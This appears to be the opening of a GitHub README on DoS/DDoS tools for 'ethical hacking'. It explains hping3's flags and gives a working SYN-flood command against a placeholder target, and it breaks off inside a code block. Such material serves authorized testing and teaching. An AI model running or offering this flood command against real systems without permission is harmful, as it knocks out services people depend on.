# DoS-DDoS-Tools-Ethical-Hacking-Use-Only
# 💥 DoS / DDoS Tools – Ethical Hacking Use Only

> ⚠️ **DISCLAIMER:** This guide is for educational and authorized penetration testing only.  
> Never perform DoS attacks on public systems or without proper permission.  
> **YOU ARE RESPONSIBLE FOR YOUR ACTIONS.**

---

## ⚙️ 1. Hping3 – TCP/UDP/ICMP Packet Crafter

-S: TCP SYN flag (SYN flood)

-p 80: Target port

--flood: Send packets as fast as possible

🔥 Can simulate TCP floods, slowloris, even scan firewalls.


```bash
hping3 -S -p 80 --flood <target-ip>
